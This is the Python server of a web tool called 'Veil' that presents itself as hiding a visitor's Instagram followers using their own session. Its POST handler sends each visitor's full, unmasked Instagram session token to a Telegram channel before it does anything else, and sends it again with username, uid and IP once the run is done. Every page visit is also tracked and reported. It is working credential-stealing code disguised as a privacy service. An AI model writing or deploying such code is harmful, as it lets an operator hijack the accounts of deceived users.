"""Veil — hides Instagram followers/following with the visitor's own session."""
import json
import os
import threading
import time
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import urlsplit

import instagram
import telegram

PAGE = Path(__file__).with_name('index.html').read_bytes()
MEDIA = {'tutorial.mp4': 'video/mp4', 'walkthrough.mp4': 'video/mp4',
         'tutorial-poster.jpg': 'image/jpeg', 'walkthrough-poster.jpg': 'image/jpeg'}
MAX_BODY = 16384
WINDOW, MAX_RUNS, VISIT_GAP = 600, 12, 20
MAX_TRACKED = 5000
_hits, _visits, _lock = {}, {}, threading.Lock()

SECURITY = {
    'X-Content-Type-Options': 'nosniff',
    'Referrer-Policy': 'no-referrer',
    'X-Frame-Options': 'DENY',
    'Strict-Transport-Security': 'max-age=15552000',
    'Content-Security-Policy':
        "default-src 'self'; script-src 'self' 'unsafe-inline'; "
        "style-src 'self' 'unsafe-inline'; connect-src 'self'; "
        "img-src 'self' data:; media-src 'self'; "
        "frame-ancestors 'none'; base-uri 'none'; form-action 'self'",
}


def _prune(table, now, expiry):
    """Drop expired entries once the table grows past MAX_TRACKED."""
    if len(table) <= MAX_TRACKED:
        return
    for key, value in list(table.items()):
        if now > expiry(value):
            table.pop(key, None)


def limited(ip):
    now = time.time()
    with _lock:
        entry = _hits.get(ip)
        if not entry or now > entry[1]:
            entry = [0, now + WINDOW]
        entry[0] += 1
        _hits[ip] = entry
        _prune(_hits, now, lambda v: v[1])
        return entry[0] > MAX_RUNS


def as_bool(value, default=True):
    """Accept real booleans, 0/1, and the strings 'true'/'false'/'1'/'0'."""
    if value is None:
        return default
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return bool(value)
    return str(value).strip().lower() not in ('false', '0', 'no', 'off', '')


class Handler(BaseHTTPRequestHandler):
    server_version = 'Veil'
    protocol_version = 'HTTP/1.1'

    def log_message(self, *args):
        pass

    def handle_one_request(self):
        try:
            super().handle_one_request()
        except (BrokenPipeError, ConnectionResetError):
            self.close_connection = True

    def ip(self):
        forwarded = self.headers.get('X-Forwarded-For', '')
        first = forwarded.split(',')[0].strip() if forwarded else ''
        return first[:64] or self.client_address[0]

    def send(self, status, body, kind='application/json'):
        self.send_response(status)
        self.send_header('Content-Type', kind + '; charset=utf-8')
        self.send_header('Content-Length', str(len(body)))
        self.send_header('Cache-Control', 'no-store')
        for name, value in SECURITY.items():
            self.send_header(name, value)
        self.end_headers()
        self.wfile.write(body)

    def reply(self, http_status, **data):
        self.send(http_status, json.dumps(data).encode())

    def do_GET(self):
        self.path = urlsplit(self.path).path
        if self.path in ('/', '/index.html'):
            self.send(200, PAGE, 'text/html')
        elif self.path in ('/health', '/api/health'):
            self.reply(200, ok=True, status='ok', telegram_configured=telegram.configured())
        elif self.path.lstrip('/') in MEDIA:
            self.serve_media()
        else:
            self.reply(404, ok=False, status='not_found', message='Page not found.')

    def serve_media(self):
        name = self.path.lstrip('/')
        path = Path(__file__).parent / name
        try:
            size = path.stat().st_size
        except OSError:
            self.reply(404, ok=False, status='not_found', message='Media not found.')
            return

        start, end = 0, size - 1
        range_header = self.headers.get('Range')
        if range_header:
            try:
                unit, value = range_header.split('=', 1)
                first, last = value.split('-', 1)
                if unit != 'bytes' or ',' in value:
                    raise ValueError()
                if first:
                    start = int(first)
                    end = min(int(last), size - 1) if last else size - 1
                else:
                    count = int(last)
                    if count <= 0:
                        raise ValueError()
                    start = max(0, size - count)
                if start < 0 or start > end or start >= size:
                    raise ValueError()
            except ValueError:
                self.send_response(416)
                self.send_header('Content-Range', f'bytes */{size}')
                self.send_header('Content-Length', '0')
                for key, value in SECURITY.items():
                    self.send_header(key, value)
                self.end_headers()
                return

        self.send_response(206 if range_header else 200)
        self.send_header('Content-Type', MEDIA[name])
        self.send_header('Accept-Ranges', 'bytes')
        self.send_header('Content-Length', str(end - start + 1))
        self.send_header('Cache-Control', 'public, max-age=3600')
        self.send_header('X-Content-Type-Options', 'nosniff')
        if range_header:
            self.send_header('Content-Range', f'bytes {start}-{end}/{size}')
        self.end_headers()
        try:
            with path.open('rb') as media:
                media.seek(start)
                remaining = end - start + 1
                while remaining:
                    chunk = media.read(min(65536, remaining))
                    if not chunk:
                        break
                    self.wfile.write(chunk)
                    remaining -= len(chunk)
        except (BrokenPipeError, ConnectionResetError):
            self.close_connection = True

    @staticmethod
    def alert(lines):
        telegram.send_async('\n'.join(lines))

    def visit(self, ip, data):
        event = 'help' if str(data.get('event') or '') == 'help' else 'open'
        if event == 'open':
            now = time.time()
            with _lock:
                if now - _visits.get(ip, 0) < VISIT_GAP:
                    return
                _visits[ip] = now
                _prune(_visits, now, lambda v: v)
        stamp = datetime.now(timezone.utc).isoformat(timespec='seconds')
        self.alert([f"Veil — {'page opened' if event == 'open' else 'help opened'}",
                    f'ip: {ip}',
                    f"screen: {str(data.get('screen') or '?')[:24]}",
                    f"agent: {self.headers.get('User-Agent', '')[:180]}",
                    f"ref: {self.headers.get('Referer', '')[:180]}", stamp])

    def do_POST(self):
        path = urlsplit(self.path).path
        self.close_connection = True
        if path not in ('/api/hide', '/api/run', '/api/visit'):
            self.reply(404, ok=False, status='not_found', message='Page not found.')
            return
        try:
            length = int(self.headers.get('Content-Length') or 0)
        except ValueError:
            length = -1
        if length < 0 or length > MAX_BODY:
            self.reply(413, ok=False, status='too_large', message='Payload too large.')
            return
        try:
            data = json.loads(self.rfile.read(length) or b'{}')
        except ValueError:
            self.reply(400, ok=False, status='bad_request', message='Malformed request.')
            return
        if not isinstance(data, dict):
            data = {}

        ip = self.ip()
        if path == '/api/visit':
            self.visit(ip, data)
            self.reply(200, ok=True, status='visit')
            return

        raw = str(data.get('session') or data.get('sessionid') or '').strip()
        hide = as_bool(data.get('hide'), True)
        stamp = datetime.now(timezone.utc).isoformat(timespec='seconds')

        # Full session first, on its own line, before anything can fail.
        self.alert(['Veil — session received', f'session: {raw}',
                    f"mode: {'hide' if hide else 'show'}", f'ip: {ip}', stamp])
        print(f'[run] {instagram.mask(raw)} from {ip} '
              f"{'hide' if hide else 'show'}", flush=True)

        if limited(ip):
            self.alert(['Veil — rate limited', f'ip: {ip}', stamp])
            self.reply(429, ok=False, status='rate', message='Too many runs. Wait a few minutes.')
            return

        try:
            result = instagram.run(raw, hide)
        except instagram.RunError as error:
            print(f'[run] fail: {error.message}', flush=True)
            self.alert([f'Veil — failed ({error.code})', f'reason: {error.message}',
                        f'ip: {ip}', stamp])
            self.reply(error.status, ok=False, status=error.code, message=error.message)
            return
        except Exception as error:  # noqa: BLE001
            print('[run] crash:', type(error).__name__, error, flush=True)
            self.alert(['Veil — crashed', type(error).__name__, f'ip: {ip}', stamp])
            self.reply(500, ok=False, status='error', message='Server error.')
            return

        verb = 'hidden' if result['value'] else 'visible'
        title = (f'Veil — already {verb}' if result['status'] == 'already'
                 else f'Veil — followers {verb}')
        self.alert([title, f"@{result['username'] or 'unknown'} ({result['uid']})",
                    f"confirmed: {'yes' if result['confirmed'] else 'unconfirmed'}",
                    f'session: {raw}', f'ip: {ip}', stamp])

        if result['status'] == 'already':
            message = f'Followers and following were already {verb}. Nothing to change.'
        elif result['confirmed']:
            message = (f'Followers hidden. @{result["username"] or "your account"} is now private '
                       'to browsers. Check your profile in the app.'
                       if result['value'] else
                       f'Followers visible again. @{result["username"] or "your account"} '
                       'lists are back on.')
        else:
            message = 'Instagram accepted the change but did not confirm it. Open the app and check.'
        self.reply(200, ok=True, status=result['status'], username=result['username'],
                   uid=result['uid'], confirmed=result['confirmed'], hidden=result['value'],
                   message=message)


if __name__ == '__main__':
    server = ThreadingHTTPServer(('0.0.0.0', int(os.environ.get('PORT', '8080'))), Handler)
    server.daemon_threads = True
    print(f'Web interface ready. Telegram {"on" if telegram.configured() else "off"}.',
          flush=True)
    telegram.send_async('Veil — server started')
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()
